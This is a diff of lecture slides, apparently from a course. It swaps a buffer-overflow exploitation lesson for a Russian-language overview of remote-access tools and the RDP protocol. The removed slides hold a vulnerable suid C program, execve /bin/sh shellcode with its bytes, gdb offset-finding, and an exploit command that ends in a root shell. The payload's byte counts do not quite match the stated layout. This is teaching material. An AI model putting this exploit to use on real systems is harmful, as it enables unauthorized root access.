@@ -39,201 +39,139 @@
 	</header>
 
 	<section class="slide">
-		<h2 class="shout">Remote Desktop Protocol<br/><small style="font-size:30px;">Check slides at <a href="https://github.com/KOPTE3/http2-slides" target="_blank">https://github.com/KOPTE3/rdp-slides</a></small></h2>
+		<h2 class="shout">Remote Desktop Protocol<br/><small style="font-size:30px;">Check slides at <a href="https://github.com/KOPTE3/rdp-slides" target="_blank">https://github.com/KOPTE3/rdp-slides</a></small></h2>
 	</section>
 
 	<section class="slide">
-		<h2>Shellcode</h2>
+		<h2>Средства удалённого доступа</h2>
 		<blockquote>
-			<p class="small-content"><b>A shellcode</b> &mdash; is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode.</p>
+			<p class="small-content"><b>Программы удалённого администрирования</b> &mdash;  программы или функции операционных систем, позволяющие получить удалённый доступ к компьютеру через Интернет или ЛВС и производить управление и администрирование удалённого компьютера в реальном времени. Программы удалённого администрирования предоставляют почти полный контроль над удалённым компьютером: они дают возможность удалённо управлять рабочим столом компьютера, возможность копирования или удаления файлов, запуска приложений...</p>
 		</blockquote>
 	</section>
 
 	<section class="slide">
-		<h2>Types of shellcode</h2>
-		<p class="small-content"></p>
+		<h2>Средства удалённого доступа</h2>
 		<ul lang="en">
-			<li>Local</li>
-			<li>Remote</li>
-			<li>Download and execute</li>
-			<li>Staged
-				<ul lang="ru">
-					<li>Egg-hunt</li>
-					<li>Omelette</li>
-				</ul>
-			</li>
+			<li>Radmin (shareware)</li>
+			<li>TeamViewer (freeware)</li>
+			<li>SSH-доступ</li>
+			<li>UltraVNC/RealVNC</li>
+			<li>RDP</li>
 		</ul>
 	</section>
 
 	<section class="slide">
-		<h2>Scenario</h2>
-		<p class="small-content">You have access to a system with an executable binary that is owned by root, has the suid bit set, and is vulnerable to buffer overflow. We will now exploit it to gain shell access</p>
+		<h2>Remote Desktop Protocol</h2>
+		<blockquote>
+			<p class="small-content"><b>Remote Desktop Protocol (протокол удалённого рабочего стола)</b> &mdash; проприетарный протокол прикладного уровня, использующийся для обеспечения удалённой работы пользователя с сервером, на котором запущен сервис терминальных подключений</p>
+		</blockquote>
 	</section>
 
 	<section class="slide">
-		<h2>Vulnerable code</h2>
-		<pre class="hljs c">
-			<code style="font-size: 80%">#include &lt;stdio.h>
-#include &lt;string.h>
-
-void func(char *name)
-{
-    char buf[100];
-    strcpy(buf, name);
-    printf("Welcome %s\n", buf);
-}
-
-int main(int argc, char *argv[])
-{
-    func(argv[1]);
-    return 0;
-}</code>
-		</pre>
-	</section>
-
-	<section class="slide">
-		<h2>Vulnerable code</h2>
-		<pre class="hljs c">
-			<code>void func(char *name)</code>
-			<code>{</code>
-			<code>    char buf[100];</code>
-			<code>    strcpy(buf, name);</code>
-			<code>    printf("Welcome %s\n", buf);</code>
-			<code>}</code>
-			<code> </code>
-		</pre>
-	</section>
-
-	<section class="slide">
-		<h2>Compile code</h2>
-		<pre class="hljs sh">
-			<code>$ gcc vuln.c -o vuln -fno-stack-protector -m32 -z execstack</code>
-			<code> </code>
-			<code># Setting up permissions</code>
-			<code>$ sudo chown root:test vuln</code>
-			<code>$ sudo chmod 550 vuln</code>
-			<code>$ sudo chmod u+s vuln</code>
-			<code> </code>
-			<code>$ ls -l vuln</code>
-			<code>> -r-sr-x--- 1 root test 7392 Dec 22 00:27 vuln</code>
-			<code> </code>
-		</pre>
-	</section>
-
-	<section class="slide">
-		<h2><code>objdump -d -M intel vuln</code></h2>
-		<div style="position:relative;width: 72%;height: 88%;overflow: hidden;margin: 0 auto;"><img class="place" src="images/vuln.png" style="transform-origin: center;transform: translate(-50%,-49%) scale(0.90);"></div>
-	</section>
-
-	<section class="slide">
-		<h2><code>objdump -d -M intel vuln</code></h2>
-		<div style="position:relative;width: 100%;height: 90%;overflow: hidden;margin: 0 auto;"><img class="place" src="images/vuln-asm.png" style="transform-origin: center;transform: translate(-50%,-54%) scale(1.3);"></div>
-	</section>
-
-	<section class="slide">
-		<h2>Scenario</h2>
-		<ul lang="ru">
-			<li>The shellcode that is to be injected is crafted.</li>
-			<li>A possible place is found where we can insert the shellcode.</li>
-			<li>The program is exploited to transfer execution flow to the location where the shellcode was inserted.</li>
+		<h2>Описание протокола RDP</h2>
+		<ul lang="en">
+			<li>По умолчанию, для подключения используется порт TCP 3389</li>
+			<li>Возможность работать с файлами на удаленном машине</li>
+			<li>Для обеспечения безопасности реализовано шифрование и 56 и 128 битным ключами</li>
+			<li>Также для функций безопасности, используется возможности протоколов TLS</li>
+			<li>Общий буфер обмена</li>
+			<li>Возможность подключения локальных ресурсов к удаленному ПК</li>
+			<li>Протокол RDP предоставляет доступ к портам локального компьютера (последовательные и параллельные)</li>
 		</ul>
 	</section>
 
 	<section class="slide">
-		<h2>Crafting Shellcode</h2>
-		<pre class="hljs nasm">
-			<code style="font-size: 75%">xor     ebx, ebx    ; Set first syscall argument to zero
-xor     eax, eax    ; eax now is zero
-mov     al, 0x17    ; syscall number of setuid is 0x17 (23)
-int     0x80        ; Make the system call
-
-xor     eax, eax    ; Clearing eax register
-push    eax         ; Pushing NULL bytes
-push    0x68732f2f  ; Pushing '//sh'
-push    0x6e69622f  ; Pushing '/bin'
-mov     ebx, esp    ; ebx now has address of '/bin//sh'
-push    eax         ; Pushing NULL byte
-mov     edx, esp    ; edx now has address of NULL byte
-push    ebx         ; Pushing address of '/bin//sh'
-mov     ecx, esp    ; ecx now has address of address of '/bin//sh' byte
-mov     al, 0x0b    ; syscall number of execve is 0x0b (11)
-
-int     0x80        ; Make the system call
-</code>
-		</pre>
+		<h2>Устройство сети, использующей RDP</h2>
+		<p class="small-content">Microsoft предполагает два режима использования протокола RDP</p>
+		<ul lang="en">
+			<li>для администрирования (Remote administration mode)</li>
+			<li>для доступа к серверу приложений (Terminal Server mode)</li>
+		</ul>
 	</section>
 
 	<section class="slide">
-		<h2>Compile code</h2>
-		<pre class="hljs sh">
-			<code>$ nasm -f elf shellcode.asm</code>
-			<code> </code>
-			<code># Get the shellcode bytes:</code>
-			<code>$ objdump -d -M intel shellcode.o</code>
-			<code> </code>
-		</pre>
+		<h2>RDP в режиме администрирования</h2>
+		<div style="position:relative;width: 100%;height: 80%;overflow: hidden;margin: 0 auto;"><img class="place" src="images/01.png" style="transform-origin: center;transform: translate(-50%,-60%) scale(1.5);"></div>
 	</section>
 
 	<section class="slide">
-		<h2>Shellcode bytes</h2>
-		<div style="position:relative;width: 100%;height: 90%;overflow: hidden;margin: 0 auto;"><img class="place" src="images/shellcode-asm.png" style="transform-origin: center;transform: translate(-50%,-55%) scale(1.2);"></div>
+		<h2>RDP в режиме доступа к серверу терминалов</h2>
+		<div style="position:relative;width: 100%;height: 80%;overflow: hidden;margin: 0 auto;"><img class="place" src="images/02.png" style="transform-origin: center;transform: translate(-50%,-60%) scale(1.5);"></div>
 	</section>
 
 	<section class="slide">
-		<h2>Extracting the bytes gives us the shellcode</h2>
-		<p class="small-content"></p>
-		<pre>
-			<code style="font-size: 130%">\x31\xdb\x31\xc0\xb0\x17\xcd\x80
-\x31\xc0\x50\x68\x2f\x2f\x73\x68
-\x68\x2f\x62\x69\x6e\x89\xe3\x50
-\x89\xe2\x53\x89\xe1\xb0\x0b\xcd
-\x80</code>
-		</pre>
+		<h2>Принцип работы RDP</h2>
+		<p class="medium-content">Протокола RDP берет за основу функции стека протоколов TCP. Первым делом, устанавливается соединение между клиентом и сервером на транспортном уровне. Затем происходит инициация сессии RDP — на этом этапе согласовываются основные параметры: шифрование, подключенные устройства, настройки графики...</p>
+		<p>RDP поддерживает несколько виртуальных каналов в рамках одного соединения, которые могут использоваться для обеспечения дополнительного функционала</p>
 	</section>
 
 	<section class="slide">
-		<h2>Finding a possible place to inject shellcode</h2>
-		<pre class="hljs sh">
-			<code>$ gdb -q vuln
-Reading symbols from vuln...(no debugging symbols found)...done.
-(gdb) break func
-Breakpoint 1 at 0x8048456
-(gdb) run $(python -c 'print "A"*116')
-Starting program: /home/test/vuln $(python -c 'print "A"*116')
-
-Breakpoint 1, 0x08048456 in func ()
-(gdb) print $ebp
-$1 = (void *) 0xffffce78
-(gdb) print $ebp - 0x6c
-$2 = (void *) 0xffffce0c</code>
-		</pre>
+		<h2>Обеспечение безопасности при использовании RDP</h2>
+		<div style="position:relative;width: 100%;height: 80%;overflow: hidden;margin: 0 auto;"><img class="place" src="images/04.png" style="transform-origin: center;transform: translate(-50%,-60%) scale(1.5);"></div>
 	</section>
 
 	<section class="slide">
-		<h2>Final payload structure</h2>
-		<p class="small-content"></p>
-		<code>[40 bytes of NOP - sled]</code><br/>
-		<code>[25 bytes of shellcode]</code><br/>
-		<code>[39 times ‘A’ will occupy 39 bytes]</code><br/>
-		<code>[4 bytes pointing in the middle of the NOP - sled: 0xffffce16]</code><br/>
+		<h2>Обеспечение безопасности при использовании RDP</h2>
+		<p class="small-content">Спецификация протокола RDP предусматривает использование одного из двух подходов к обеспечению безопасности</p>
+		<ul lang="en">
+			<li>Standard RDP Security (встроенная подсистема безопасности)</li>
+			<li>Enhanced RDP Security (внешняя подсистема безопасности)</li>
+		</ul>
 	</section>
 
 	<section class="slide">
-		<h2>So let’s try to execute it</h2>
-		<pre class="hljs sh">
-			<code>$ ./vuln $(python -c
-'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68
-\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1
-\xb0\x0b\xcd\x80" + "A"*47 + "\x20\xce\xff\xff"')
-
-����������������������������������������j
-          X�Rhn/shh//bi��RS��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAA4���
-# whoami
-root
-			</code>
-		</pre>
+		<h2>Standard RDP Security</h2>
+		<p>Аутентификация</p>
+		<ul lang="en">
+			<li>При старте системы генерируется пара RSA-ключей</li>
+			<li>Создается сертификат (Proprietary Certificate) открытого ключа</li>
+			<li>Сертификат подписывается RSA-ключом, зашитым в операционную систему (любой RDP-клиент содержит открытый ключ данного встроенного RSA-ключа)</li>
+			<li>Клиент подключается к серверу терминалов и получает Proprietary Certificate</li>
+			<li>Клиент проверяет сертификат и получает открытый ключ сервера (данный ключ используется в дальнейшем для согласования параметров шифрования)</li>
+		</ul>
 	</section>
+
+	<section class="slide">
+		<h2>Standard RDP Security</h2>
+		<p>Шифрование</p>
+		<p>В качестве алгоритма шифрования выбран потоковый шифр RC4. В зависимости от версии операционной системы доступны различные длины ключа от 40 до 168 бит</p>
+	</section>
+
+	<section class="slide">
+		<h2>Standard RDP Security</h2>
+		<p>Целостность</p>
+		<p>Целостность сообщения достигается применением алгоритма генерации MAC (Message Authentication Code) на базе алгоритмов MD5 и SHA1</p>
+	</section>
+
+	<section class="slide">
+		<h2>RDP-клиенты</h2>
+		<p>Windows, Mac OS/iOS, Android и Linux</p>
+		<ul>
+			<li>FreeRDP и Remmina &mdash; linux</li>
+			<li>Клиент удалённого рабочего стола для Windows</li>
+			<li>Microsoft Remote Desktop &mdash; Android & iOS</li>
+			<li><a href="https://technet.microsoft.com/ru-ru/library/dn473009vws.11.aspx">https://technet.microsoft.com/ru-ru/library/dn473009</a></li>
+			<li>Расширения для браузеров</li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>RDP в сравнении с TeamViewer</h2>
+		<ul>
+			<li>RDP does not allow the user of the remote computer to see or control their screen when you connect to them</li>
+			<li>RDP requires you to configure port forwarding on the remote computer’s firewall or router</li>
+		</ul>
+	</section>
+
+
+
+
+
+
+
+
+
+
 
 
 	<section class="slide">
